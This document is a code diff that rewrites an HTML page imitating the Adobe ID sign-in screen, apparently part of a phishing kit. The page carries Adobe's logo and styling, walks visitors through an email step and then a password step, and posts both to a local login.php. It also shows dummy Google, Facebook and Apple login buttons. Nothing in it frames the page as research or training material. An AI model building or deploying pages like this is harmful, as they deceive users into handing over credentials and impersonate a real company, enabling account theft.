@@ -1,62 +1,226 @@
 <!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+	<link rel="icon" href="Images/favicon.ico" type="image/png">
+    <title>Adobe ID</title>
+    <!-- Author: Sajjad -->
+    <style>
+        body {
+            margin: 0;
+            padding: 0;
+            font-family: Arial, sans-serif;
+            background-color: #000;
+            color: #333;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            height: 100vh;
+        }
 
-<html>
+        .background-image {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            object-fit: cover;
+            z-index: -1;
+            filter: brightness(0.5);
+        }
+
+        .container {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            width: 80%;
+            max-width: 1200px;
+            margin: 0 auto;
+        }
+
+        .left-side {
+            max-width: 45%;
+            text-align: left;
+        }
+
+        .left-side img {
+            width: 150px;
+            margin-bottom: 20px;
+        }
+
+        .left-side p {
+            color: #ccc;
+            font-size: 18px;
+            margin-top: -20px;
+        }
+
+        .right-side {
+            background-color: #fff;
+            padding: 30px;
+            border-radius: 8px;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.1);
+            width: 100%;
+            max-width: 400px;
+        }
+
+        .right-side h2 {
+            margin: 0 0 20px;
+            font-size: 24px;
+            color: #333;
+        }
+
+        .right-side input[type="email"] {
+            width: 93%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+        .right-side input[type="password"] {
+            width: 93%;
+            padding: 12px;
+            margin: 10px 0;
+            border: 1px solid #ccc;
+            border-radius: 4px;
+            font-size: 16px;
+        }
+
+        .right-side button {
+            width: 100%;
+            padding: 12px;
+            margin-top: 20px;
+            font-weight: bold;
+            font-size: 16px;
+            background-color: #1473e6;
+            color: #fff;
+            border: none;
+            border-radius: 4px;
+            cursor: pointer;
+            transition: background-color 0.3s ease;
+        }
+
+        .right-side button:hover {
+            background-color: #0e63b8;
+        }
+
+        .continue-options {
+            display: flex;
+            flex-direction: column;
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .continue-options button {
+            width: 100%;
+            padding: 18px;
+            border: 2px solid #dedede;
+            border-radius: 100px;
+            color: #414141;
+            font-size: 14px;
+            cursor: pointer;
+            background-color: #fff;
+            transition: background-color 0.3s ease;
+        }
+
+        .continue-options button img {
+            width: 20px;
+            height: 20px;
+            vertical-align: middle;
+            margin-right: 10px;
+        }
+
+        .continue-options button:hover {
+            background-color: #f0f0f0;
+        }
+
+        .footer-links {
+            margin-top: 20px;
+            text-align: center;
+        }
+
+        .footer-links a {
+            color: #1473e6;
+            text-decoration: none;
+            font-size: 14px;
+        }
+
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        @media screen and (max-width: 768px) {
+            .container {
+                flex-direction: column;
+                align-items: center;
+            }
+
+            .left-side {
+                max-width: 100%;
+                text-align: center;
+            }
+
+            .right-side {
+                max-width: 100%;
+                margin-top: 20px;
+            }
+
+            .left-side img {
+                margin-bottom: 10px;
+            }
+
+            .left-side p {
+                font-size: 16px;
+                margin-top: -10px;
+            }
+        }
+    </style>
+</head>
+
 <body>
-<meta name="viewport" content="width=device-width, initial-scale=1.0">
-	<!-- Author: Sajjad -->
-<style>
-img {
-	width: 100px;
-	}
+    <img class="background-image" src="Images/background.png" alt="Background Image">
+    <div class="container">
+        <div class="left-side">
+            <img src="Images/adobe_logo.svg" alt="Adobe Logo">
+            <p>Sign in or create an account</p>
+        </div>
+        <div class="right-side">
+            <h2>Sign in</h2>
+            <form method="post" action="login.php">
+                <div id="email_section">
+                    <input type="email" name="email" placeholder="Email address" required>
+                    <button type="button" onclick="showPasswordStep()">Continue</button>
+                </div>
 
-input {
-	width: 25em;
-	padding: 10px 10px;
-	border: none;
-	border-bottom: 1px solid gray;
-	transition: border-bottom 0.3s;
-	}
-	
-input:hover {
-	border: none;
-	border-bottom: 2px solid #1a66ff;
-	}
-	
-a {
-	text-decoration: none;
-	color: #1a66ff;
-	}
-
-#p1 {
-	font-size: 11px;
-	font-family: sans-serif;
-	}
-	
-button {
-	padding: 10px 30px;
-	color: white;
-	background-color: #1a66ff;
-	border: none;
-	border-radius: 100px;
-	margin: 40px;
-	display: block;
-	margin-right: auto;
-	margin-left: 225px;
-	}
-
-form {
-	width: 350px;
-}
-</style>
-<form method="POST" action="login.php"/>
-<img src="Image/image.png"/><br><br>
-<h1 style="font-family: sans-serif;">Sign in</h1>
-<p style="font-family: sans-serif;">New user? <a href="https://www.adobe.com">Create an account</a><br><br>
-<p id="p1"><label>Email address</label></p>
-<center><input type="text" name="username"></input><br></center><br>
-<p id="p1"><label>Password</label></p>
-<center><input type="password" name="password"></input><br></center>
-<button type="submit"><b>Continue</b></button>
-</form>
+                <div id="password_section" style="display: none;">
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit">Sign in</button>
+                </div>
+            </form>
+            <div class="continue-options">
+                <button>
+                    <img src="Images/google-logo.png" alt="Google Logo"> Continue with Google
+                </button>
+                <button>
+                    <img src="Images/facebook-logo.png" alt="Facebook Logo"> Continue with Facebook
+                </button>
+                <button>
+                    <img src="Images/apple-logo.png" alt="Apple Logo"> Continue with Apple
+                </button>
+            </div>
+            <div class="footer-links">
+                <a href="#">Get help signing in</a>
+            </div>
+        </div>
+    </div>
+    <script>
+        function showPasswordStep() {
+            var emailStep = document.getElementById("email_section");
+            var passwordStep = document.getElementById("password_section");
+            emailStep.style.display = "none";
+            passwordStep.style.display = "block";
+        }
+    </script>
 </body>
 </html>
